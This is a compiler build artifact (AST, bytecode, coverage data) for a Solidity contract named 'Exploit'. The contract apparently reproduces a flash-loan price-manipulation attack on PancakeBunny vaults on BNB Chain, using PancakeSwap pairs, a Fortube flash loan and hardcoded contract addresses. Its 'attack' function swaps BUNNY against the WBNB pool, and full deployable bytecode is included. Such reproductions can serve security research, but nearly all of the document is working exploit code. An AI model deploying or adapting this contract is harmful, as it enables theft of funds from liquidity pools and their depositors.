                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "-",
                    "rightExpression": {
                      "hexValue": "31",
                      "id": 539,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "5117:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1_by_1",
                        "typeString": "int_const 1"
                      },
                      "value": "1"
                    },
                    "src": "5084:34:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "5064:54:0"
                },
                {
                  "assignments": [
                    543,
                    545,
                    null
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 543,
                      "mutability": "mutable",
                      "name": "amount0",
                      "nameLocation": "5134:7:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "5129:12:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 542,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "5129:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    },
                    {
                      "constant": false,
                      "id": 545,
                      "mutability": "mutable",
                      "name": "amount1",
                      "nameLocation": "5148:7:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "5143:12:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 544,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "5143:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    },
                    null
                  ],
                  "id": 549,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 546,
                        "name": "WBNB_BUNNY",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 72,
                        "src": "5161:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$869",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 547,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getReserves",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 811,
                      "src": "5161:22:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
                        "typeString": "function () view external returns (uint112,uint112,uint32)"
                      }
                    },
                    "id": 548,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5161:24:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
                      "typeString": "tuple(uint112,uint112,uint32)"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "5128:57:0"
                },
                {
                  "assignments": [
                    551
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 551,
                      "mutability": "mutable",
                      "name": "amountIn",
                      "nameLocation": "5200:8:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "5195:13:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 550,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "5195:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 553,
                  "initialValue": {
                    "id": 552,
                    "name": "bunnyBalance",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 531,
                    "src": "5211:12:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "5195:28:0"
                },
                {
                  "assignments": [
                    555
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 555,
                      "mutability": "mutable",
                      "name": "amountOut",
                      "nameLocation": "5238:9:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "5233:14:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 554,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "5233:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 562,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 558,
                        "name": "bunnyBalance",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 531,
                        "src": "5270:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 559,
                        "name": "amount1",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 545,
                        "src": "5284:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 560,
                        "name": "amount0",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 543,
                        "src": "5293:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 556,
                        "name": "router",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 81,
                        "src": "5250:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeRouter01_$1291",
                          "typeString": "contract IPancakeRouter01"
                        }
                      },
                      "id": 557,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getAmountOut",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1257,
                      "src": "5250:19:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_pure$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                        "typeString": "function (uint256,uint256,uint256) pure external returns (uint256)"
                      }
                    },
                    "id": 561,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5250:51:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "5233:68:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 568,
                            "name": "WBNB_BUNNY",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 72,
                            "src": "5335:10:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IPancakePair_$869",
                              "typeString": "contract IPancakePair"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IPancakePair_$869",
                              "typeString": "contract IPancakePair"
                            }
                          ],
                          "id": 567,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "5327:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 566,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "5327:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 569,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "5327:19:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 570,
                        "name": "amountIn",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 551,
                        "src": "5348:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 563,
                        "name": "BUNNY",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 24,
                        "src": "5312:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$629",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 565,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 598,
                      "src": "5312:14:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 571,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5312:45:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 572,
                  "nodeType": "ExpressionStatement",
                  "src": "5312:45:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 576,
                        "name": "amountOut",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 555,
                        "src": "5383:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 577,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5394:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "id": 580,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "5405:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Exploit_$587",
                              "typeString": "contract Exploit"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Exploit_$587",
                              "typeString": "contract Exploit"
                            }
                          ],
                          "id": 579,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "5397:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 578,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "5397:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 581,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "5397:13:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "hexValue": "",
                        "id": 582,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5412:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        },
                        "value": ""
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        }
                      ],
                      "expression": {
                        "id": 573,
                        "name": "WBNB_BUNNY",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 72,
                        "src": "5367:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$869",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 575,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "swap",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 853,
                      "src": "5367:15:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                        "typeString": "function (uint256,uint256,address,bytes memory) external"
                      }
                    },
                    "id": 583,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5367:48:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 584,
                  "nodeType": "ExpressionStatement",
                  "src": "5367:48:0"
                }
              ]
            },
            "id": 586,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nameLocation": "4211:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 422,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "4217:2:0"
            },
            "returnParameters": {
              "id": 423,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "4228:0:0"
            },
            "scope": 587,
            "src": "4202:1220:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "private"
          }
        ],
        "scope": 588,
        "src": "85:5339:0",
        "usedErrors": []
      }
    ],
    "src": "32:5392:0"
  },
  "bytecode": "600280546001600160a01b031990811673bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c179091556003805482167355d398326f99059ff775485246999027b319795517905560048054821673c9849e6fdb743d08faee3e34dd2d1bc69ea11a5117905560058054821673dc2bbb0d33e0e7dea9f5b98f46edbac823586a0c1790556006805482167316b9a82891338f9ba80e2d6970fdda79d1eb0dae1790556007805490911673633e538ecf0bee1a18c2edfe10c4da0d6e71e77b178155610160604052730ed7e52944161450477ee417de9cd3a859b14fd060809081527358f876857a02d6762e0101bb5c46a8c1ed44dc1660a0527374e4716e431f45807dcf19f284c7aa99f18a4fbc60c0527361eb789d75a95caa3ff50ed7e47b96c132fec08260e052739adc6fb78cefa07e13e9294f150c1e8c1dd566c06101005273f3bc6fc080ffcc30d93df48bfa2aa14b869554bb6101205273dd5bad8f8b360d76d12fda230f8baf42fe0022cf6101405261017f9160089190610228565b50600f80546001600160a01b0319908116730cea0832e9cdbb5d476040d58ea07ecfbebb7672179091556010805482167320bcc3b8a0091ddac2d0bc30f68e6cbb97de59cd179055601180548216737bb89460599dbf32ee3aa50798bbceae2a5f7f6a179055601280549091167305ff2b0db69458a0750badebc4f9e13add608c7f17905534801561021057600080fd5b50600080546001600160a01b03191633179055610295565b8260078101928215610270579160200282015b8281111561027057825182546001600160a01b0319166001600160a01b0390911617825560209092019160019091019061023b565b5061027c929150610280565b5090565b5b8082111561027c5760008155600101610281565b61153780620002a56000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80638480081214610051578063be9a655514610066578063dffeadd01461006e578063ee87255814610076575b600080fd5b61006461005f36600461125e565b610089565b005b61006461057e565b61006461080d565b61006461008436600461125e565b6109f2565b6000610097828401846112f4565b91505060018060008282546100ac919061132c565b90915550506001546007111561035e576000806008600154600781106100d4576100d4611344565b0160009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610126573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061014a9190611376565b506001600160701b031691506001600160701b0316915060086001546007811061017657610176611344565b0160009054906101000a90046001600160a01b03166001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101c8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ec91906113c6565b6002546001600160a01b039182169116036102ae5760086001546007811061021657610216611344565b01546001600160a01b031663022c0d9f60006102336001856113ea565b604080516000602082015260018183015281518082038301815260608201928390526001600160e01b031960e087901b16909252610277939291309160640161144e565b600060405180830381600087803b15801561029157600080fd5b505af11580156102a5573d6000803e3d6000fd5b50505050610357565b6008600154600781106102c3576102c3611344565b01546001600160a01b031663022c0d9f6102de6001856113ea565b6040805160006020820181905291810182905230906060016040516020818303038152906040526040518563ffffffff1660e01b8152600401610324949392919061144e565b600060405180830381600087803b15801561033e57600080fd5b505af1158015610352573d6000803e3d6000fd5b505050505b50506103f0565b600f546003546040516363ad2c4160e01b81523060048201526001600160a01b0391821660248201526a02732cd04c6a4800a64a856044820152608060648201526002608482015261060f60f31b60a48201529116906363ad2c419060c401600060405180830381600087803b1580156103d757600080fd5b505af11580156103eb573d6000803e3d6000fd5b505050505b60008115610421576126f761040786612710611485565b61041191906114a4565b61041c90600161132c565b610445565b6126f761043087612710611485565b61043a91906114a4565b61044590600161132c565b6002546040516370a0823160e01b815230600482015291925082916001600160a01b03909116906370a08231906024016020604051808303816000875af1158015610494573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104b891906114c6565b10156104ff5760405162461bcd60e51b81526020600482015260116024820152701b9bdd081b585ada5b99c81c1c9bda599d607a1b60448201526064015b60405180910390fd5b60025460405163a9059cbb60e01b8152336004820152602481018390526001600160a01b039091169063a9059cbb906044016020604051808303816000875af1158015610550573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061057491906114df565b5050505050505050565b6000546001600160a01b031633146105d85760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f7420746865206f776e657200000000000000000060448201526064016104f6565b60025460055460405163095ea7b360e01b81526001600160a01b039182166004820152670de0b6b3a7640000602482015291169063095ea7b390604401600060405180830381600087803b15801561062f57600080fd5b505af1158015610643573d6000803e3d6000fd5b5050600554600254600654604051631c4009f960e01b81526001600160a01b039283166004820152670de0b6b3a76400006024820152908216604482015291169250631c4009f99150606401600060405180830381600087803b1580156106a957600080fd5b505af11580156106bd573d6000803e3d6000fd5b50506006546040516370a0823160e01b8152306004820152600093506001600160a01b0390911691506370a0823190602401602060405180830381865afa15801561070c573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061073091906114c6565b60065460075460405163095ea7b360e01b81526001600160a01b03918216600482015260248101849052929350169063095ea7b3906044016020604051808303816000875af1158015610787573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107ab91906114df565b5060075460405163b6b55f2560e01b8152600481018390526001600160a01b039091169063b6b55f2590602401600060405180830381600087803b1580156107f257600080fd5b505af1158015610806573d6000803e3d6000fd5b5050505050565b6000806008810160009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610865573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108899190611376565b506008546040805163d21220a760e01b815290516001600160701b0394851696509290931693506001600160a01b03169163d21220a79160048083019260209291908290030181865afa1580156108e4573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061090891906113c6565b6002546001600160a01b039182169116036109b9576008546001600160a01b031663022c0d9f600061093b6001856113ea565b604080516000602082015260019181019190915230906060015b6040516020818303038152906040526040518563ffffffff1660e01b8152600401610983949392919061144e565b600060405180830381600087803b15801561099d57600080fd5b505af11580156109b1573d6000803e3d6000fd5b505050505050565b6008546001600160a01b031663022c0d9f6109d56001856113ea565b604080516000602082018190529181018290523090606001610955565b6109fa610aef565b600354600f546040805163f77c479160e01b815290516001600160a01b039384169363a9059cbb93169163f77c479191600480830192602092919082900301816000875af1158015610a50573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a7491906113c6565b6040516001600160e01b031960e084901b1681526001600160a01b0390911660048201526a0273ad42557ccc5c6686ca60248201526044016020604051808303816000875af1158015610acb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109b191906114df565b6002546040516370a0823160e01b815230600482015260009169032d26d12e980b600000916001600160a01b03909116906370a08231906024016020604051808303816000875af1158015610b48573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b6c91906114c6565b610b7691906113ea565b60025460055460405163095ea7b360e01b81526001600160a01b0391821660048201526000196024820152929350169063095ea7b390604401600060405180830381600087803b158015610bc957600080fd5b505af1158015610bdd573d6000803e3d6000fd5b5050600554600254600654604051631c4009f960e01b81526001600160a01b03928316600482015269032d26d12e980b6000006024820152908216604482015291169250631c4009f99150606401600060405180830381600087803b158015610c4557600080fd5b505af1158015610c59573d6000803e3d6000fd5b50506006546040516370a0823160e01b81523060048201526001600160a01b03909116925063a9059cbb9150829081906370a0823190602401602060405180830381865afa158015610caf573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610cd391906114c6565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610d1e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d4291906114df565b50600080601060009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610d99573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610dbd9190611376565b50601254604051630153543560e21b8152600481018790526001600160701b03928316602482018190529390921660448301819052945091925084916000916001600160a01b039091169063054d50d490606401602060405180830381865afa158015610e2e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e5291906114c6565b60025460105460405163a9059cbb60e01b81526001600160a01b03918216600482015260248101869052929350169063a9059cbb906044016020604051808303816000875af1158015610ea9573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ecd91906114df565b5060105460405163022c0d9f60e01b8152600481018390526000602482018190523060448301526080606483015260848201526001600160a01b039091169063022c0d9f9060a401600060405180830381600087803b158015610f2f57600080fd5b505af1158015610f43573d6000803e3d6000fd5b50505050600760009054906101000a90046001600160a01b03166001600160a01b0316633d18b9126040518163ffffffff1660e01b8152600401600060405180830381600087803b158015610f9757600080fd5b505af1158015610fab573d6000803e3d6000fd5b5050600480546040516370a0823160e01b8152309281019290925260009350600192506001600160a01b0316906370a08231906024016020604051808303816000875af1158015611000573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061102491906114c6565b61102e91906113ea565b9050600080601160009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015611086573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110aa9190611376565b50601254604051630153543560e21b8152600481018790526001600160701b03928316602482018190529390921660448301819052945091925084916000916001600160a01b039091169063054d50d490606401602060405180830381865afa15801561111b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061113f91906114c6565b6004805460115460405163a9059cbb60e01b81526001600160a01b039182169381019390935260248301869052929350919091169063a9059cbb906044016020604051808303816000875af115801561119c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906111c091906114df565b5060115460405163022c0d9f60e01b8152600481018390526000602482018190523060448301526080606483015260848201526001600160a01b039091169063022c0d9f9060a401600060405180830381600087803b15801561122257600080fd5b505af1158015611236573d6000803e3d6000fd5b5050505050505050505050505050565b6001600160a01b038116811461125b57600080fd5b50565b60008060008060006080868803121561127657600080fd5b853561128181611246565b94506020860135935060408601359250606086013567ffffffffffffffff808211156112ac57600080fd5b818801915088601f8301126112c057600080fd5b8135818111156112cf57600080fd5b8960208285010111156112e157600080fd5b9699959850939650602001949392505050565b6000806040838503121561130757600080fd5b50508035926020909101359150565b634e487b7160e01b600052601160045260246000fd5b6000821982111561133f5761133f611316565b500190565b634e487b7160e01b600052603260045260246000fd5b80516001600160701b038116811461137157600080fd5b919050565b60008060006060848603121561138b57600080fd5b6113948461135a565b92506113a26020850161135a565b9150604084015163ffffffff811681146113bb57600080fd5b809150509250925092565b6000602082840312156113d857600080fd5b81516113e381611246565b9392505050565b6000828210156113fc576113fc611316565b500390565b6000815180845260005b818110156114275760208185018101518683018201520161140b565b81811115611439576000602083870101525b50601f01601f19169290920160200192915050565b84815283602082015260018060a01b038316604082015260806060820152600061147b6080830184611401565b9695505050505050565b600081600019048311821515161561149f5761149f611316565b500290565b6000826114c157634e487b7160e01b600052601260045260246000fd5b500490565b6000602082840312156114d857600080fd5b5051919050565b6000602082840312156114f157600080fd5b815180151581146113e357600080fdfea26469706673582212206f25289f5cef75c845902483302c8a5ffd31a7f717a6bb0cefc707a992bb48ce64736f6c634300080f0033",
  "bytecodeSha1": "408ca043f387e91639774d15d18d6447bac4ff45",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.15+commit.e14f2714"
  },
  "contractName": "Exploit",
  "coverageMap": {
    "branches": {
      "0": {
        "Exploit.main": {
          "25": [
            2366,
            2423,
            false
          ]
        },
        "Exploit.pancakeCall": {
          "22": [
            3128,
            3188,
            false
          ],
          "23": [
            3736,
            3746,
            true
          ],
          "24": [
            3838,
            3880,
            true
          ]
        }
      },
      "1": {}
    },
    "statements": {
      "0": {
        "Exploit.attack": {
          "14": [
            4340,
            4388
          ],
          "15": [
            4398,
            4466
          ],
          "16": [
            4476,
            4568
          ],
          "17": [
            4862,
            4926
          ],
          "18": [
            4936,
            5004
          ],
          "19": [
            5015,
            5053
          ],
          "20": [
            5312,
            5357
          ],
          "21": [
            5367,
            5415
          ]
        },
        "Exploit.executeOperation": {
          "12": [
            4075,
            4083
          ],
          "13": [
            4094,
            4188
          ]
        },
        "Exploit.main": {
          "10": [
            2439,
            2524
          ],
          "11": [
            2555,
            2640
          ]
        },
        "Exploit.pancakeCall": {
          "0": [
            2984,
            2993
          ],
          "1": [
            3236,
            3324
          ],
          "2": [
            3392,
            3480
          ],
          "3": [
            3573,
            3660
          ],
          "4": [
            3830,
            3902
          ],
          "5": [
            3912,
            3948
          ]
        },
        "Exploit.start": {
          "6": [
            1904,
            1939
          ],
          "7": [
            1949,
            2013
          ],
          "8": [
            2094,
            2168
          ],
          "9": [
            2178,
            2226
          ]
        }
      },
      "1": {}
    }
  },
  "dependencies": [
    "IERC20",
    "IFortubeBank",
    "IPancakeERC20",
    "IPancakePair",
    "IPancakeRouter01",
    "IVaultFlipToFlip",
    "IZap"
  ],
  "deployedBytecode": "608060405234801561001057600080fd5b506004361061004c5760003560e01c80638480081214610051578063be9a655514610066578063dffeadd01461006e578063ee87255814610076575b600080fd5b61006461005f36600461125e565b610089565b005b61006461057e565b61006461080d565b61006461008436600461125e565b6109f2565b6000610097828401846112f4565b91505060018060008282546100ac919061132c565b90915550506001546007111561035e576000806008600154600781106100d4576100d4611344565b0160009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610126573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061014a9190611376565b506001600160701b031691506001600160701b0316915060086001546007811061017657610176611344565b0160009054906101000a90046001600160a01b03166001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101c8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ec91906113c6565b6002546001600160a01b039182169116036102ae5760086001546007811061021657610216611344565b01546001600160a01b031663022c0d9f60006102336001856113ea565b604080516000602082015260018183015281518082038301815260608201928390526001600160e01b031960e087901b16909252610277939291309160640161144e565b600060405180830381600087803b15801561029157600080fd5b505af11580156102a5573d6000803e3d6000fd5b50505050610357565b6008600154600781106102c3576102c3611344565b01546001600160a01b031663022c0d9f6102de6001856113ea565b6040805160006020820181905291810182905230906060016040516020818303038152906040526040518563ffffffff1660e01b8152600401610324949392919061144e565b600060405180830381600087803b15801561033e57600080fd5b505af1158015610352573d6000803e3d6000fd5b505050505b50506103f0565b600f546003546040516363ad2c4160e01b81523060048201526001600160a01b0391821660248201526a02732cd04c6a4800a64a856044820152608060648201526002608482015261060f60f31b60a48201529116906363ad2c419060c401600060405180830381600087803b1580156103d757600080fd5b505af11580156103eb573d6000803e3d6000fd5b505050505b60008115610421576126f761040786612710611485565b61041191906114a4565b61041c90600161132c565b610445565b6126f761043087612710611485565b61043a91906114a4565b61044590600161132c565b60025